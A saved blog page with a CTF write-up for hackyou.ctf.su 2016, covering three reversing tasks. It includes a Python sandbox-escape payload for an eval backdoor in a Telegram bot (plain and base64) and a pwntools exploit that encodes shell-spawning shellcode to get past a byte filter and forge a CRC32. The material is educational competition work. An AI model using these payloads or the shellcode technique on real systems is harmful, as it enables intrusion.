@@ -1,0 +1,652 @@
+<!DOCTYPE html>
+<!--[if IE 7]>
+<html class="ie ie7" lang="en-US">
+<![endif]-->
+<!--[if IE 8]>
+<html class="ie ie8" lang="en-US">
+<![endif]-->
+<!--[if !(IE 7) & !(IE 8)]><!-->
+<html lang="en-US">
+<!--<![endif]-->
+<head>
+	<meta charset="UTF-8">
+	<meta name="viewport" content="width=device-width">
+	<title>hackyou.ctf.su 2016 | BabyPhD CTF Team</title>
+	<link rel="profile" href="http://gmpg.org/xfn/11">
+	<link rel="pingback" href="https://babyphd.net/xmlrpc.php">
+	<!--[if lt IE 9]>
+	<script src="https://babyphd.net/wp-content/themes/twentythirteen/js/html5.js"></script>
+	<![endif]-->
+	<script type='text/javascript'>function ctSetCookie(c_name, value, def_value){document.cookie = c_name + '=' + escape(value) + '; path=/';}ctSetCookie('ct_checkjs', '1181016728', '0');</script><link rel='dns-prefetch' href='https://s0.wp.com/' />
+<link rel='dns-prefetch' href='https://fonts.googleapis.com/' />
+<link rel='dns-prefetch' href='https://s.w.org/' />
+<link href='https://fonts.gstatic.com' crossorigin rel='preconnect' />
+<link rel="alternate" type="application/rss+xml" title="BabyPhD CTF Team &raquo; Feed" href="../../../../feed/index.html" />
+<link rel="alternate" type="application/rss+xml" title="BabyPhD CTF Team &raquo; Comments Feed" href="../../../../comments/feed/index.html" />
+<link rel="alternate" type="application/rss+xml" title="BabyPhD CTF Team &raquo; hackyou.ctf.su 2016 Comments Feed" href="feed/index.html" />
+		<script type="text/javascript">
+			window._wpemojiSettings = {"baseUrl":"https:\/\/s.w.org\/images\/core\/emoji\/12.0.0-1\/72x72\/","ext":".png","svgUrl":"https:\/\/s.w.org\/images\/core\/emoji\/12.0.0-1\/svg\/","svgExt":".svg","source":{"concatemoji":"https:\/\/babyphd.net\/wp-includes\/js\/wp-emoji-release.min.js?ver=5.2.2"}};
+			!function(a,b,c){function d(a,b){var c=String.fromCharCode;l.clearRect(0,0,k.width,k.height),l.fillText(c.apply(this,a),0,0);var d=k.toDataURL();l.clearRect(0,0,k.width,k.height),l.fillText(c.apply(this,b),0,0);var e=k.toDataURL();return d===e}function e(a){var b;if(!l||!l.fillText)return!1;switch(l.textBaseline="top",l.font="600 32px Arial",a){case"flag":return!(b=d([55356,56826,55356,56819],[55356,56826,8203,55356,56819]))&&(b=d([55356,57332,56128,56423,56128,56418,56128,56421,56128,56430,56128,56423,56128,56447],[55356,57332,8203,56128,56423,8203,56128,56418,8203,56128,56421,8203,56128,56430,8203,56128,56423,8203,56128,56447]),!b);case"emoji":return b=d([55357,56424,55356,57342,8205,55358,56605,8205,55357,56424,55356,57340],[55357,56424,55356,57342,8203,55358,56605,8203,55357,56424,55356,57340]),!b}return!1}function f(a){var c=b.createElement("script");c.src=a,c.defer=c.type="text/javascript",b.getElementsByTagName("head")[0].appendChild(c)}var g,h,i,j,k=b.createElement("canvas"),l=k.getContext&&k.getContext("2d");for(j=Array("flag","emoji"),c.supports={everything:!0,everythingExceptFlag:!0},i=0;i<j.length;i++)c.supports[j[i]]=e(j[i]),c.supports.everything=c.supports.everything&&c.supports[j[i]],"flag"!==j[i]&&(c.supports.everythingExceptFlag=c.supports.everythingExceptFlag&&c.supports[j[i]]);c.supports.everythingExceptFlag=c.supports.everythingExceptFlag&&!c.supports.flag,c.DOMReady=!1,c.readyCallback=function(){c.DOMReady=!0},c.supports.everything||(h=function(){c.readyCallback()},b.addEventListener?(b.addEventListener("DOMContentLoaded",h,!1),a.addEventListener("load",h,!1)):(a.attachEvent("onload",h),b.attachEvent("onreadystatechange",function(){"complete"===b.readyState&&c.readyCallback()})),g=c.source||{},g.concatemoji?f(g.concatemoji):g.wpemoji&&g.twemoji&&(f(g.twemoji),f(g.wpemoji)))}(window,document,window._wpemojiSettings);
+		</script>
+		<style type="text/css">
+img.wp-smiley,
+img.emoji {
+	display: inline !important;
+	border: none !important;
+	box-shadow: none !important;
+	height: 1em !important;
+	width: 1em !important;
+	margin: 0 .07em !important;
+	vertical-align: -0.1em !important;
+	background: none !important;
+	padding: 0 !important;
+}
+</style>
+	<link rel='stylesheet' id='wp-block-library-css'  href='../../../../wp-includes/css/dist/block-library/style.min.css%3Fver=5.2.2.css' type='text/css' media='all' />
+<link rel='stylesheet' id='twentythirteen-fonts-css'  href='https://fonts.googleapis.com/css?family=Source+Sans+Pro%3A300%2C400%2C700%2C300italic%2C400italic%2C700italic%7CBitter%3A400%2C700&#038;subset=latin%2Clatin-ext' type='text/css' media='all' />
+<link rel='stylesheet' id='genericons-css'  href='../../../../wp-content/plugins/jetpack/_inc/genericons/genericons/genericons.css%3Fver=3.1.css' type='text/css' media='all' />
+<link rel='stylesheet' id='twentythirteen-style-css'  href='../../../../wp-content/themes/twentythirteen/style.css%3Fver=2013-07-18.css' type='text/css' media='all' />
+<!--[if lt IE 9]>
+<link rel='stylesheet' id='twentythirteen-ie-css'  href='https://babyphd.net/wp-content/themes/twentythirteen/css/ie.css?ver=2013-07-18' type='text/css' media='all' />
+<![endif]-->
+<link rel='stylesheet' id='social-logos-css'  href='../../../../wp-content/plugins/jetpack/_inc/social-logos/social-logos.min.css%3Fver=1.css' type='text/css' media='all' />
+<link rel='stylesheet' id='jetpack_css-css'  href='../../../../wp-content/plugins/jetpack/css/jetpack.css%3Fver=7.5.2.css' type='text/css' media='all' />
+<script type='text/javascript' src='../../../../wp-includes/js/jquery/jquery.js%3Fver=1.12.4-wp'></script>
+<script type='text/javascript' src='../../../../wp-includes/js/jquery/jquery-migrate.min.js%3Fver=1.4.1'></script>
+<script type='text/javascript'>
+/* <![CDATA[ */
+var related_posts_js_options = {"post_heading":"h4"};
+/* ]]> */
+</script>
+<script type='text/javascript' src='../../../../wp-content/plugins/jetpack/_inc/build/related-posts/related-posts.min.js%3Fver=20190204'></script>
+<script type='text/javascript'>
+/* <![CDATA[ */
+var ctPublic = {"_ajax_nonce":"a204603c59","_ajax_url":"https:\/\/babyphd.net\/wp-admin\/admin-ajax.php"};
+/* ]]> */
+</script>
+<script type='text/javascript' src='../../../../wp-content/plugins/cleantalk-spam-protect/js/apbct-public.min.js%3Fver=5.122'></script>
+<script type='text/javascript'>
+/* <![CDATA[ */
+var ctNocache = {"ajaxurl":"https:\/\/babyphd.net\/wp-admin\/admin-ajax.php","info_flag":"","set_cookies_flag":"","blog_home":"https:\/\/babyphd.net\/"};
+/* ]]> */
+</script>
+<script type='text/javascript' src='../../../../wp-content/plugins/cleantalk-spam-protect/js/cleantalk_nocache.min.js%3Fver=5.122'></script>
+<link rel='https://api.w.org/' href='../../../../wp-json/index.html' />
+<link rel="EditURI" type="application/rsd+xml" title="RSD" href="../../../../xmlrpc.php%3Frsd" />
+<link rel="wlwmanifest" type="application/wlwmanifest+xml" href="../../../../wp-includes/wlwmanifest.xml" /> 
+<link rel='prev' title='Whitehat Contest 12 - Pwn400' href='../../../09/11/whitehat-contest-11-pwn400/index.html' />
+<link rel='next' title='ASISCTF 2017 - Web - Secure portal [1,2,3]' href='../../../../2017/05/12/asisctf-2017-web-secure-portal-123/index.html' />
+<meta name="generator" content="WordPress 5.2.2" />
+<link rel="canonical" href="index.html" />
+<link rel='shortlink' href='https://wp.me/p72HMd-a7' />
+<link rel="alternate" type="application/json+oembed" href="../../../../wp-json/oembed/1.0/embed%3Furl=https:%252F%252Fbabyphd.net%252F2016%252F11%252F24%252Fhackyou-ctf-su-2016%252F" />
+<link rel="alternate" type="text/xml+oembed" href="../../../../wp-json/oembed/1.0/embed%3Furl=https:%252F%252Fbabyphd.net%252F2016%252F11%252F24%252Fhackyou-ctf-su-2016%252F&amp;format=xml" />
+
+<link rel='dns-prefetch' href='https://v0.wordpress.com/'/>
+<link rel='dns-prefetch' href='https://i0.wp.com/'/>
+<link rel='dns-prefetch' href='https://i1.wp.com/'/>
+<link rel='dns-prefetch' href='https://i2.wp.com/'/>
+<style type='text/css'>img#wpstats{display:none}</style>		<style type="text/css">.recentcomments a{display:inline !important;padding:0 !important;margin:0 !important;}</style>
+			<style type="text/css" id="twentythirteen-header-css">
+			.site-header {
+			background: url(../../../../wp-content/themes/twentythirteen/images/headers/star.png) no-repeat scroll top;
+			background-size: 1600px auto;
+		}
+		@media (max-width: 767px) {
+			.site-header {
+				background-size: 768px auto;
+			}
+		}
+		@media (max-width: 359px) {
+			.site-header {
+				background-size: 360px auto;
+			}
+		}
+		</style>
+	
+<!-- Jetpack Open Graph Tags -->
+<meta property="og:type" content="article" />
+<meta property="og:title" content="hackyou.ctf.su 2016" />
+<meta property="og:url" content="https://babyphd.net/2016/11/24/hackyou-ctf-su-2016/" />
+<meta property="og:description" content="This is my write-up for recent hack you spb CTF &#8211; a CTF for newbies. I guess I&#8217;m a bit older here ahaha." />
+<meta property="article:published_time" content="2016-11-24T17:13:17+00:00" />
+<meta property="article:modified_time" content="2017-07-27T19:02:33+00:00" />
+<meta property="og:site_name" content="BabyPhD CTF Team" />
+<meta property="og:image" content="https://s0.wp.com/i/blank.jpg" />
+<meta property="og:locale" content="en_US" />
+<meta name="twitter:text:title" content="hackyou.ctf.su 2016" />
+<meta name="twitter:card" content="summary" />
+
+<!-- End Jetpack Open Graph Tags -->
+			<style type="text/css" id="wp-custom-css">
+				code {
+    padding: 2px 4px;
+    margin: 0;
+    border-radius: 2px;
+    color: #222;
+    background: #f2f4f5;
+}			</style>
+		</head>
+
+<body class="post-template-default single single-post postid-627 single-format-standard sidebar">
+	<div id="page" class="hfeed site">
+		<header id="masthead" class="site-header" role="banner">
+			<a class="home-link" href="../../../../index.html" title="BabyPhD CTF Team" rel="home">
+				<h1 class="site-title">BabyPhD CTF Team</h1>
+				<h2 class="site-description">Nói chung đây là một khái niệm vô cùng trừu tượng</h2>
+			</a>
+
+			<div id="navbar" class="navbar">
+				<nav id="site-navigation" class="navigation main-navigation" role="navigation">
+					<button class="menu-toggle">Menu</button>
+					<a class="screen-reader-text skip-link" href="index.html#content" title="Skip to content">Skip to content</a>
+					<div id="primary-menu" class="nav-menu"><ul>
+<li class="page_item page-item-2"><a href="../../../../ctf-wtf/index.html">CTF</a></li>
+</ul></div>
+					<form role="search" method="get" class="search-form" action="../../../../index.html">
+				<label>
+					<span class="screen-reader-text">Search for:</span>
+					<input type="search" class="search-field" placeholder="Search &hellip;" value="" name="s" />
+				</label>
+				<input type="submit" class="search-submit" value="Search" />
+			</form>				</nav><!-- #site-navigation -->
+			</div><!-- #navbar -->
+		</header><!-- #masthead -->
+
+		<div id="main" class="site-main">
+
+	<div id="primary" class="content-area">
+		<div id="content" class="site-content" role="main">
+
+						
+				
+<article id="post-627" class="post-627 post type-post status-publish format-standard hentry category-pwn category-re">
+	<header class="entry-header">
+		
+				<h1 class="entry-title">hackyou.ctf.su 2016</h1>
+		
+		<div class="entry-meta">
+			<span class="date"><a href="index.html" title="Permalink to hackyou.ctf.su 2016" rel="bookmark"><time class="entry-date" datetime="2016-11-24T17:13:17+00:00">November 24, 2016</time></a></span><span class="categories-links"><a href="../../../../category/pwn/index.html" rel="category tag">pwn</a>, <a href="../../../../category/re/index.html" rel="category tag">re</a></span><span class="author vcard"><a class="url fn n" href="../../../../author/justcallmedude/index.html" title="View all posts by justcallmedude" rel="author">justcallmedude</a></span>					</div><!-- .entry-meta -->
+	</header><!-- .entry-header -->
+
+		<div class="entry-content">
+		<p>This is my write-up for recent <a href="http://hackyou.ctf.su/">hack you spb</a> CTF - a CTF for newbies. I guess I'm a bit older here ahaha.</p>
+<p><span id="more-627"></span></p>
+<p>Reverse 100:</p>
+<pre class="lang:c decode:true ">#include &lt;stdio.h&gt;
+#include &lt;string.h&gt;
+
+int main() {
+	char buf[64];
+	gets(buf);
+	int l = strlen(buf);
+	if (l * l != 144)
+		return 1;
+	unsigned int a = buf[0] | (buf[4] &lt;&lt; 8) | (buf[8] &lt;&lt; 16);
+	unsigned int b = buf[1] | (buf[5] &lt;&lt; 8) | (buf[9] &lt;&lt; 16);
+	unsigned int c = buf[2] | (buf[6] &lt;&lt; 8) | (buf[10] &lt;&lt; 16);
+	unsigned int d = buf[3] | (buf[7] &lt;&lt; 8) | (buf[11] &lt;&lt; 16);
+	if (!(((a % 3571) == 2963) &amp;&amp; (((a % 2843) == 215)) &amp;&amp; (((a % 30243) == 13059))))
+		return 2;
+	if (!(((b % 80735) == 51964) &amp;&amp; (((b % 8681) == 2552)) &amp;&amp; (((b % 40624) == 30931))))
+		return 3;
+	if (!(((c % 99892) == 92228) &amp;&amp; (((c % 45629) == 1080)) &amp;&amp; (((c % 24497) == 12651))))
+		return 4;
+	if (!(((d % 54750) == 26981) &amp;&amp; (((d % 99627) == 79040)) &amp;&amp; (((d % 84339) == 77510))))
+		return 5;
+	printf("Congratulations %s is flag\n",buf);
+	return 0;
+}</pre>
+<p>First of all, I think about use something like z3, or any SAT that could give me the valid number. But z3 took a lot of time, so I decided to look deeper... Yes, you could finger out there is a pattern (x % number1 == number2), so you could apply <b><a href="https://en.wikipedia.org/wiki/Chinese_remainder_theorem">Chinese remainder theorem</a> </b>to get a, b, c.</p>
+<p>Reverse 200:<br />
+This is a .pyc file, which is a file contain python byte-code. As usual, for byte-code relative problems, I search for some python byte-code decompiler and found <a href="https://github.com/zrax/pycdc">pycdc</a>.<br />
+After decompil, you should get something like this</p>
+<pre class="lang:python decode:true"># Source Generated with Decompyle++
+# File: rev200_bot_7b541a1.pyc (Python 2.7)
+
+import config
+import traceback
+import re
+from base64 import *
+from twx.botapi import TelegramBot, ReplyKeyboardMarkup, ReplyKeyboardHide
+sec_state = { }
+
+def process_message(bot, u):
+Warning: Stack history is not empty!
+    if u.message.sender and u.message.text and u.message.chat:
+        chat_id = u.message.chat.id
+        user = u.message.sender.username
+        reply_hide = ReplyKeyboardHide.create()
+        print 'user:%s mes:%s' % (user, u.message.text)
+        if user not in sec_state:
+            sec_state[user] = {
+                'mode': 15,
+                'stage': 7 }
+        cmd1 = u.message.text.encode('utf-8')
+        a = re.findall('(\\/\\w+)\\s*(.*)', cmd1)
+        if a:
+            cmd = a[0][0]
+            data = a[0][1]
+            if cmd == '/help':
+                bot.send_message(chat_id, 'Usage: \n\n/help - show this help\n/enter - enter secret mode\n', reply_markup = reply_hide)
+            if cmd == '/enter':
+                keyboard = [
+                    [
+                        '-7-',
+                        '-8-',
+                        '-9-'],
+                    [
+                        '-4-',
+                        '-5-',
+                        '-6-'],
+                    [
+                        '-1-',
+                        '-2-',
+                        '-3-'],
+                    [
+                        '-0-']]
+                reply_markup = ReplyKeyboardMarkup.create(keyboard)
+                bot.send_message(chat_id, 'please enter access code', reply_markup = reply_markup).wait()
+            if sec_state[user]['mode'] == 0 and cmd == '/7779317':
+                ddd = b64decode(data)
+                bot.send_message(chat_id, eval(ddd))
+            
+        a = re.findall('-(\\d+)-', cmd1)
+        if a:
+            num = a[0]
+            if int(num) == sec_state[user]['stage']:
+                sec_state[user]['stage'] = (sec_state[user]['stage'] * sec_state[user]['stage'] ^ 1337) % 10
+                sec_state[user]['mode'] = sec_state[user]['mode'] - 1
+                if sec_state[user]['mode'] &lt; 0:
+                    sec_state[user]['mode'] = 0
+                if sec_state[user]['mode'] == 0:
+                    bot.send_message(chat_id, 'Secret mode enabled!', reply_markup = reply_hide).wait()
+                
+            else:
+                print 'NO', num, sec_state[user]['stage']
+                bot.send_message(chat_id, 'Invalid password!', reply_markup = reply_hide).wait()
+                sec_state[user]['mode'] = 15
+        
+
+bot = TelegramBot(config.token)
+bot.update_bot_info().wait()
+print bot.username
+last_update_id = 0
+while True:
+    updates = bot.get_updates(offset = last_update_id).wait()
+    
+    try:
+        for update in updates:
+            if int(update.update_id) &gt; int(last_update_id):
+                last_update_id = update.update_id
+                process_message(bot, update)
+                continue
+    continue
+    except Exception:
+        ex = None
+        print traceback.format_exc()
+        continue
+    
+</pre>
+<p>So this is a kind of chat-bot server based on Telegram.<br />
+There is eval function inside,  bot.send_message(chat_id, eval(ddd)), so I need to control ddd which is a base64 decoded string from data we sent. Before that, I need to enter Secret mode by enter correct access code (0-9).<br />
+First, set sec_state[user]['mode'] = 0; First time, stage init to 7, that changed everytime you press the correct key; But if I dont remember the stage, I still could find out by bruteforce from 0 to 9, if I didn't recv incorrect message that's mean I pressed the correct one; then by use the following script, I'm able to access secret area;</p>
+<pre class="lang:python decode:true ">#coding: utf-8
+sec_state = { }
+user = "A"
+sec_state[user] = {
+'mode': 15,
+'stage': 7 } # bruteforce number
+sec_state[user]['mode'] = 15
+r = []
+while 1:
+	num = sec_state[user]['stage']
+	r.append(num)
+	print "-%d-" % num
+	sec_state[user]['stage'] = (sec_state[user]['stage'] * sec_state[user]['stage'] ^ 1337) % 10
+	sec_state[user]['mode'] = sec_state[user]['mode'] - 1
+	if sec_state[user]['mode'] &lt; 0:
+	    sec_state[user]['mode'] = 0
+	if sec_state[user]['mode'] == 0:
+		break
+
+print sec_state[user]['mode']</pre>
+<p>Next, this is a <a href="https://blog.inexplicity.de/plaidctf-2013-pyjail-writeup-part-i-breaking-the-sandbox.html">pyjail</a>, so I can't execute normal python command...<br />
+So, final payload is `str(().__class__.__base__.__subclasses__()[<strong>40</strong>]("flag","r").read())`or `/7779317 c3RyKCgpLl9fY2xhc3NfXy5fX2Jhc2VfXy5fX3N1YmNsYXNzZXNfXygpWzQwXSgiZmxhZyIsInIiKS5yZWFkKCkp`</p>
+<p>Reverse 300:<br />
+Let's get some fun.</p>
+<p>let reverse this (or not?), look at handler (the main function)</p>
+<pre class="lang:c decode:true">ssize_t __cdecl handler(int fd)
+{
+  ssize_t result; // eax@1
+  unsigned int buf; // [sp+20h] [bp-18h]@1
+  int v3; // [sp+24h] [bp-14h]@1
+  char *v4; // [sp+28h] [bp-10h]@4
+  int v5; // [sp+2Ch] [bp-Ch]@4
+
+  buf = 0;
+  setuid(0x3E8u);
+  seteuid(0x3E8u);
+  setgid(0x3E8u);
+  setegid(0x3E8u);
+  result = recv(fd, &amp;buf, 4u, 0);
+  v3 = result;
+  if ( result == 4 )
+  {
+    result = buf;
+    if ( buf &lt;= 0xC8 )
+    {
+      v4 = (char *)mmap(0, buf, 7, 33, -1, 0);
+      v3 = recv(fd, v4, buf, 0);
+      result = crc32(0, v4, buf);
+      v5 = result;
+      if ( result == 0xCAFEBABE )
+      {
+        result = filter(v4, buf) ^ 1;
+        if ( !(_BYTE)result )
+          result = ((int (*)(void))v4)();
+      }
+    }
+  }
+  return result;
+}</pre>
+<p>So the basic idea is make result == 0xCAFEBABE, so the program will execute v4 as shellcode (function pointer), but you also need to bypass the filter function - check if contain any of 0x0, 0x1, 0x2f, 0x68, 0x73 ( so I can't use sh in plaintext)then exit; So, I did the following step:</p>
+<p>1. Find a program that can make crc32 of my shellcode equal 0xCAFEBABE<br />
+2. Make a great shellcode and Bypass filter.<br />
+By search google for everything, the answer for problem 1 is<a href="https://www.nayuki.io/page/forcing-a-files-crc-to-any-value"> force-crc32</a>.<br />
+Currently I'm also trying to learn some binary exploit method, write a shellcode isn't hard (hint <em>xor</em>), but if there is any framework that's good enough as <a href="https://github.com/Gallopsled/pwntools"><code>pwntools</code> </a>, you shoud try at least once.<br />
+Basicaly, I import pwns and let pwntools do the rest;</p>
+<pre class="lang:python decode:true ">from pwn import *
+import socket, struct, telnetlib
+def getCRC(data):
+	import subprocess
+	with open('/tmp/12', 'wb') as f:
+		f.write(data + "123456")
+	subprocess.check_output(['python', 'forcecrc32.py', '/tmp/12', str(len(data)+1) , 'CAFEBABE'])
+	with open('/tmp/12', 'rb') as f:
+		data = f.read()
+	return data
+def crc32(data):# recheck
+	import zlib
+	return (zlib.crc32(data)) &amp; 0xffffffff
+
+
+d = ""
+d += asm(pwnlib.shellcraft.i386.linux.dup2(4,0))
+d += asm(pwnlib.shellcraft.i386.linux.dup2(4,1))
+# i need dup2 because the program use itself as server
+d += asm(pwnlib.shellcraft.i386.linux.sh())
+
+fsc = pwnlib.encoders.encoder.encode(d, '\n\x01\0\x2f\x73\x68')
+
+print len(fsc)
+fsc = getCRC(fsc) # it didn't contain any blocked char, so i dont need to re-generate again.
+print hex(crc32(fsc))
+
+#yes, i love my custom socket lib 🙁
+s = socket.create_connection(("78.46.101.237", 3177))
+
+s.send(p32(len(fsc)))
+s.send(fsc)
+s.send("\n")
+
+s.send("cat flag*\n") 
+print s.recv(1024)</pre>
+<p>To be continued....</p>
+<div class="sharedaddy sd-sharing-enabled"><div class="robots-nocontent sd-block sd-social sd-social-icon sd-sharing"><h3 class="sd-title">Share this:</h3><div class="sd-content"><ul><li class="share-twitter"><a rel="nofollow noopener noreferrer" data-shared="sharing-twitter-627" class="share-twitter sd-button share-icon no-text" href="index.html%3Fshare=twitter.html" target="_blank" title="Click to share on Twitter"><span></span><span class="sharing-screen-reader-text">Click to share on Twitter (Opens in new window)</span></a></li><li class="share-facebook"><a rel="nofollow noopener noreferrer" data-shared="sharing-facebook-627" class="share-facebook sd-button share-icon no-text" href="index.html%3Fshare=facebook.html" target="_blank" title="Click to share on Facebook"><span></span><span class="sharing-screen-reader-text">Click to share on Facebook (Opens in new window)</span></a></li><li class="share-end"></li></ul></div></div></div>
+<div id='jp-relatedposts' class='jp-relatedposts' >
+	<h3 class="jp-relatedposts-headline"><em>Related</em></h3>
+</div>	</div><!-- .entry-content -->
+	
+	<footer class="entry-meta">
+		
+					
+<div class="author-info">
+	<div class="author-avatar">
+		<img alt='' src='https://secure.gravatar.com/avatar/dd7fceff26d16f923d65217300e0799e?s=74&#038;d=blank&#038;r=g' srcset='https://secure.gravatar.com/avatar/dd7fceff26d16f923d65217300e0799e?s=148&#038;d=blank&#038;r=g 2x' class='avatar avatar-74 photo' height='74' width='74' />	</div><!-- .author-avatar -->
+	<div class="author-description">
+		<h2 class="author-title">About justcallmedude</h2>
+		<p class="author-bio">
+			I was a student. I'm watching you 'cause I have 10 eyes :"&gt;			<a class="author-link" href="../../../../author/justcallmedude/index.html" rel="author">
+				View all posts by justcallmedude <span class="meta-nav">&rarr;</span>			</a>
+		</p>
+	</div><!-- .author-description -->
+</div><!-- .author-info -->			</footer><!-- .entry-meta -->
+</article><!-- #post -->
+					<nav class="navigation post-navigation" role="navigation">
+		<h1 class="screen-reader-text">Post navigation</h1>
+		<div class="nav-links">
+
+			<a href="../../../09/11/whitehat-contest-11-pwn400/index.html" rel="prev"><span class="meta-nav">&larr;</span> Whitehat Contest 12 - Pwn400</a>			<a href="../../../../2017/05/12/asisctf-2017-web-secure-portal-123/index.html" rel="next">ASISCTF 2017 - Web - Secure portal [1,2,3] <span class="meta-nav">&rarr;</span></a>
+		</div><!-- .nav-links -->
+	</nav><!-- .navigation -->
+					
+<div id="comments" class="comments-area">
+
+			<h2 class="comments-title">
+			2 thoughts on &ldquo;<span>hackyou.ctf.su 2016</span>&rdquo;		</h2>
+
+		<ol class="comment-list">
+					<li id="comment-7474" class="comment even thread-even depth-1 parent">
+			<article id="div-comment-7474" class="comment-body">
+				<footer class="comment-meta">
+					<div class="comment-author vcard">
+						<img alt='' src='https://secure.gravatar.com/avatar/ac688f3e2be1ad288facf89ebac47ec0?s=74&#038;d=blank&#038;r=g' srcset='https://secure.gravatar.com/avatar/ac688f3e2be1ad288facf89ebac47ec0?s=148&#038;d=blank&#038;r=g 2x' class='avatar avatar-74 photo' height='74' width='74' />						<b class="fn">zun</b> <span class="says">says:</span>					</div><!-- .comment-author -->
+
+					<div class="comment-metadata">
+						<a href="index.html#comment-7474">
+							<time datetime="2016-12-26T07:42:40+00:00">
+								December 26, 2016 at 7:42 am							</time>
+						</a>
+											</div><!-- .comment-metadata -->
+
+									</footer><!-- .comment-meta -->
+
+				<div class="comment-content">
+					<p>in [Reverse 100] problem, other simple way is to use Klee to solve</p>
+<p>#include<br />
+#include<br />
+#include </p>
+<p>#define ITERS 12<br />
+int main() {<br />
+	char buf[ITERS];<br />
+	klee_make_symbolic(buf, ITERS, "012345");<br />
+	unsigned int a = buf[0] | (buf[4] &lt;&lt; 8) | (buf[8] &lt;&lt; 16);<br />
+	unsigned int b = buf[1] | (buf[5] &lt;&lt; 8) | (buf[9] &lt;&lt; 16);<br />
+	unsigned int c = buf[2] | (buf[6] &lt;&lt; 8) | (buf[10] &lt;&lt; 16);<br />
+	unsigned int d = buf[3] | (buf[7] &lt;&lt; 8) | (buf[11] &lt;&lt; 16);<br />
+	if (!(((a % 3571) == 2963) &amp;&amp; (((a % 2843) == 215)) &amp;&amp; (((a % 30243) == 13059))))<br />
+		return 2;<br />
+	if (!(((b % 80735) == 51964) &amp;&amp; (((b % 8681) == 2552)) &amp;&amp; (((b % 40624) == 30931))))<br />
+		return 3;<br />
+	if (!(((c % 99892) == 92228) &amp;&amp; (((c % 45629) == 1080)) &amp;&amp; (((c % 24497) == 12651))))<br />
+		return 4;<br />
+	if (!(((d % 54750) == 26981) &amp;&amp; (((d % 99627) == 79040)) &amp;&amp; (((d % 84339) == 77510))))<br />
+		return 5;<br />
+	// printf(&quot;Congratulations %s is flag\n&quot;,buf);<br />
+	klee_assert(0);<br />
+	return 0;<br />
+}</p>
+				</div><!-- .comment-content -->
+
+							</article><!-- .comment-body -->
+		<ol class="children">
+		<li id="comment-8120" class="comment byuser comment-author-justcallmedude bypostauthor odd alt depth-2">
+			<article id="div-comment-8120" class="comment-body">
+				<footer class="comment-meta">
+					<div class="comment-author vcard">
+						<img alt='' src='https://secure.gravatar.com/avatar/dd7fceff26d16f923d65217300e0799e?s=74&#038;d=blank&#038;r=g' srcset='https://secure.gravatar.com/avatar/dd7fceff26d16f923d65217300e0799e?s=148&#038;d=blank&#038;r=g 2x' class='avatar avatar-74 photo' height='74' width='74' />						<b class="fn">justcallmedude</b> <span class="says">says:</span>					</div><!-- .comment-author -->
+
+					<div class="comment-metadata">
+						<a href="index.html#comment-8120">
+							<time datetime="2017-07-27T13:39:55+00:00">
+								July 27, 2017 at 1:39 pm							</time>
+						</a>
+											</div><!-- .comment-metadata -->
+
+									</footer><!-- .comment-meta -->
+
+				<div class="comment-content">
+					<p>nice, I'll try KLEE next time 😀</p>
+				</div><!-- .comment-content -->
+
+							</article><!-- .comment-body -->
+		</li><!-- #comment-## -->
+</ol><!-- .children -->
+</li><!-- #comment-## -->
+		</ol><!-- .comment-list -->
+
+		
+				<p class="no-comments">Comments are closed.</p>
+		
+	
+	
+</div><!-- #comments -->
+			
+		</div><!-- #content -->
+	</div><!-- #primary -->
+
+	<div id="tertiary" class="sidebar-container" role="complementary">
+		<div class="sidebar-inner">
+			<div class="widget-area">
+						<aside id="recent-posts-6" class="widget widget_recent_entries">		<h3 class="widget-title">Recent Posts</h3>		<ul>
+											<li>
+					<a href="../../../../2018/08/01/meepwn-ctf-2018-meepwn-contract/index.html">MEEPWN CTF 2018 - meepwn contract</a>
+									</li>
+											<li>
+					<a href="../../../../2018/07/17/meepwn-ctf-2018-xss/index.html">MEEPWN CTF 2018 - XSS</a>
+									</li>
+											<li>
+					<a href="../../../../2018/07/17/meepwn-ctf-2018-pycalx2/index.html">MEEPWN CTF 2018 - PyCalx2</a>
+									</li>
+											<li>
+					<a href="../../../../2017/08/10/wtf-is-safefinderoperatormac-campaign/index.html">What is SafeFinder/OperatorMac campaign?</a>
+									</li>
+											<li>
+					<a href="../../../../2017/07/27/meepwnctf-2017-injection/index.html">MeepwnCTF 2017 - injection</a>
+									</li>
+					</ul>
+		</aside><aside id="recent-comments-2" class="widget widget_recent_comments"><h3 class="widget-title">Recent Comments</h3><ul id="recentcomments"><li class="recentcomments"><span class="comment-author-link">justcallmedude</span> on <a href="index.html#comment-8120">hackyou.ctf.su 2016</a></li><li class="recentcomments"><span class="comment-author-link">zun</span> on <a href="index.html#comment-7474">hackyou.ctf.su 2016</a></li><li class="recentcomments"><span class="comment-author-link">Tony</span> on <a href="../../../03/12/writeup-for-beginners-bof-vulnerability-lab-syracuse-university/index.html#comment-7218">Writeup for beginners - BoF Vulnerability Lab (Syracuse University)</a></li><li class="recentcomments"><span class="comment-author-link">john</span> on <a href="../../../09/11/whitehat-contest-11-pwn400/index.html#comment-7211">Whitehat Contest 12 - Pwn400</a></li><li class="recentcomments"><span class="comment-author-link"><a href='../../../../index.html' rel='external nofollow' class='url'>chuymichxinhdep</a></span> on <a href="../../../09/11/whitehat-contest-11-pwn400/index.html#comment-7210">Whitehat Contest 12 - Pwn400</a></li></ul></aside><aside id="archives-3" class="widget widget_archive"><h3 class="widget-title">Archives</h3>		<ul>
+				<li><a href='../../../../2018/08/index.html'>August 2018</a></li>
+	<li><a href='../../../../2018/07/index.html'>July 2018</a></li>
+	<li><a href='../../../../2017/08/index.html'>August 2017</a></li>
+	<li><a href='../../../../2017/07/index.html'>July 2017</a></li>
+	<li><a href='../../../../2017/05/index.html'>May 2017</a></li>
+	<li><a href='../../index.html'>November 2016</a></li>
+	<li><a href='../../../09/index.html'>September 2016</a></li>
+	<li><a href='../../../07/index.html'>July 2016</a></li>
+	<li><a href='../../../04/index.html'>April 2016</a></li>
+	<li><a href='../../../03/index.html'>March 2016</a></li>
+	<li><a href='../../../../2015/10/index.html'>October 2015</a></li>
+	<li><a href='../../../../2015/09/index.html'>September 2015</a></li>
+	<li><a href='../../../../2015/05/index.html'>May 2015</a></li>
+	<li><a href='../../../../2015/04/index.html'>April 2015</a></li>
+	<li><a href='../../../../2015/02/index.html'>February 2015</a></li>
+	<li><a href='../../../../2015/01/index.html'>January 2015</a></li>
+		</ul>
+			</aside><aside id="categories-2" class="widget widget_categories"><h3 class="widget-title">Categories</h3>		<ul>
+				<li class="cat-item cat-item-32"><a href="../../../../category/chuymich/index.html">chuymich</a>
+</li>
+	<li class="cat-item cat-item-18"><a href="../../../../category/crypto/index.html">crypto</a>
+</li>
